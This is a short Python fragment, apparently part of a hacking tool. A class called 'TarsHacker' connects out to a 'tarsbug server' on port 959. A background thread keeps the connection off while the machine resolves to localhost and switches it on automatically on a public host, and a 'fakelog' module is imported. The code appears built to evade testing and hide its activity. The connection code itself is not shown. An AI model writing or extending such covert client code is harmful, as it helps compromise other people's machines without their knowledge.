import socket, os, sys, time
from threading import Thread
from .import fakelog

class TarsHacker(object):
	"""TarsHacker connects to the tarsbug server. bug's default port : 959"""
	def __init__(self, domain:str, port:int=959):
		super(TarsHacker, self).__init__()
		self.domain = domain
		self.port = port
		self.running = False

	def ensurepublichost(self):
		Thread(target=self._eph_).start()

	def _eph_(self):
		"""ensures that hacker is not running on localhost"""
		while True:
			if socket.gethostbyname(socket.gethostname()) in ["localhost", "127.0.0.1"]:
				if self.running: self.close()
				self.running = False
			else:
				if not self.running: self.init()
				self.running = True
			time.sleep(5)
